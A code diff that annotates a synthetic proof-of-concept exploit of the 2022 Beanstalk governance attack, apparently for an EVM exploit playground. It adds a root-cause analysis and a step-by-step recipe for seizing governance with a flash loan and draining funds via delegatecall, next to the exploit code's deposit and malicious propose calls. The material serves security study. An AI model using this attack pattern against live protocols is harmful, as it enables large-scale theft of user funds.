@@ -1,6 +1,23 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+// VULNERABILITY: Governance Hijack via Flash-Loan Instant Stalk + Unrestricted Diamond Init Delegatecall (Beanstalk 2022-04)
+// Root Cause (cross-referenced to real sources):
+//   - Stalk (governance power) is minted 1:1 with deposits into the Silo with ZERO time delay (see Account.Silo.stalk + roots in AppStorage).
+//   - propose(FacetCut[], _init, _calldata, pauseFlag) records a DiamondCut struct into governance storage without any delay or review for the init payload.
+//   - emergencyCommit(uint32) allows immediate execution of a BIP once its Stalk-weighted vote passes. No timelock on the execution step for this path.
+//   - Execution of a BIP performs the stored _init.delegatecall(_calldata) inside the Diamond proxy context (LibDiamond.initializeDiamondCut + Diamond fallback).
+//   - The Diamond contract holds user deposits + protocol reserves of many tokens. delegatecall context gives the payload full ability to transfer them.
+//   - Flash loan + Curve (3pool + bean3crv metapool at 0x3a70DfA7...) allows renting enormous "depositable" balance to outvote everyone else temporarily.
+//   - No restriction that _init must be a trusted facet or that calldata must be a known upgrade action.
+// Evidence in this file:
+//   run(): seed deposit (L127), propose with _init=this + sweep selector (L131)
+//   executeOperation(): flash LP construction (L180), silo deposit (L193), emergencyCommit (L197), sweep effect visible after
+//   sweep(): the payload that runs under delegatecall (L213)
+// Impact: Complete theft of protocol funds (~$182M on mainnet). PoC version recovers the LP via sweep to cleanly repay flashloan.
+
+
+
 // Synthetic standalone exploit for the EVM Playground (2022-04-Beanstalk).
 //
 // The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
@@ -123,6 +140,7 @@ contract BeanstalkGovernance {
         // 2. Deposit the seed Beans into the Beanstalk Silo for instant Stalk.
         bean.approve(address(beanstalk), type(uint256).max);
         beanstalk.depositBeans(bean.balanceOf(address(this)));
+        // VULNERABILITY (seed Stalk): depositBeans synchronously credits stalk. Minimal capital lets attacker call propose().
 
         // 3. Propose the malicious BIP: empty diamondCut, `_init` = this contract,
         //    `_calldata` = sweep.selector. When the BIP is committed, the Diamond
@@ -130,6 +148,14 @@ contract BeanstalkGovernance {
         //    the Diamond's storage context.
         IBeanStalk.FacetCut[] memory cut = new IBeanStalk.FacetCut[](0);
         beanstalk.propose(cut, address(this), abi.encodeWithSelector(this.sweep.selector), 3);
+        // EXPLOIT STEPS (high level):
+        // 1. Acquire seed Stalk via small ETH->BEAN->depositBeans.
+        // 2. Propose BIP with _init=attacker, calldata=sweep (or drain fn).
+        // 3. Flash-borrow stables, route through Curve 3Crv + bean3Crv_f to obtain huge LP balance.
+        // 4. deposit(LP) -> instant Stalk majority (the root cause of "instant" power).
+        // 5. emergencyCommit(BIP) -> governance executes delegatecall(_init, calldata) in Diamond ctx.
+        // 6. Payload (sweep) drains held tokens because delegatecall sees Diamond's balances.
+        // 7. Unwind LP, repay flash + premium; attacker keeps net stolen value.
 
         // (The live attack waited ~24h for BIP #18's vote-of-confidence window to
         // open before emergency-committing; the Foundry PoC warps block.timestamp.
